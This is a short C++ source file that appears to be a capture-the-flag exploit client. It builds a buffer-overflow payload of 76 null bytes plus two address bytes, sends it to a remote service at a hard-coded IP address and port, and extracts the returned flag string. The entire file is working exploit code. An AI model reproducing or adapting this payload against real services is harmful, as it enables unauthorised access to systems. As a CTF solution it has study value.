#include<iostream>
#include"Tube.h"

using namespace std;
string HA_main() {
	string afds;
	string a = "";
	for (int j = 0; j < 76; j++)a += '\0';
	a += char(134); a += char(7);//00000111(7) 10000110(134)
	RemoteSession ses = remote("123.56.218.81", 9999);
	ses.recv();
	ses.sendline(a);
	Sleep(200);
	afds = ses.recv();
	afds = afds.substr(0, afds.find("}") + 1);
	return afds;
}